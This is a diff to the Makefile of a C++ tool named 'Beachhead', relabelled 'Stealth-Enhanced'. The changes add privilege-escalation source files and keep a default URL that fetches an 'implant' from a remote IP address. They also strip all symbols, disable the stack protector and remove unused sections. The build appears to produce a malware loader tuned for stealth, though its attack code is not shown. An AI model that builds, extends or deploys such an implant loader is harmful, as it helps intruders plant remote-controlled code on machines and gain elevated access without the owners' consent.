@@ -1,32 +1,29 @@
-# Beachhead Makefile
-# Usage:
-#   make          - build release version (stripped, no debug output)
-#   make debug    - build debug version (symbols, verbose logging)
-
+# Beachhead Makefile (Stealth-Enhanced)
 URL ?= "http://10.37.1.249/implant"
-CERT_URL = "http://10.37.1.249/cert.pem"
 
 CXX = g++
-
-# Release flags (default)
-RELEASE_FLAGS = -O2 -s -DURL='$(URL)' -DCERT_URL='$(CERT_URL)'
-
-# Debug flags (add -DDEBUG, -g, remove -s)
-DEBUG_FLAGS = -O0 -g -DDEBUG -DURL='$(URL)' -DCERT_URL='$(CERT_URL)'
+CXXFLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
+           -ffunction-sections -fdata-sections -DURL='$(URL)'
+LDFLAGS = -Wl,--gc-sections
 
 TARGET = beachhead
-SRC = beachhead.cpp
+SRCS = beachhead.cpp privesc_check.cpp privesc.cpp
+OBJS = $(SRCS:.cpp=.o)
 
 all: $(TARGET)
 
-$(TARGET): $(SRC)
-	$(CXX) $(RELEASE_FLAGS) -o $(TARGET) $(SRC)
+$(TARGET): $(OBJS)
+	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
+	strip --strip-all $(TARGET)
 
-debug: $(SRC)
-	$(CXX) $(DEBUG_FLAGS) -o $(TARGET) $(SRC)
-	@echo "[+] Debug build complete: $(TARGET) (symbols retained, logging enabled)"
+debug: CXXFLAGS = -O0 -g -DDEBUG -DURL='$(URL)'
+debug: clean $(TARGET)
+	@echo "[+] Debug build complete (symbols retained, logging enabled)"
+
+%.o: %.cpp privesc_check.h privesc.h
+	$(CXX) $(CXXFLAGS) -c $< -o $@
 
 clean:
-	rm -f $(TARGET)
+	rm -f $(TARGET) $(OBJS)
 
-.PHONY: all debug clean
+.PHONY: all clean debug
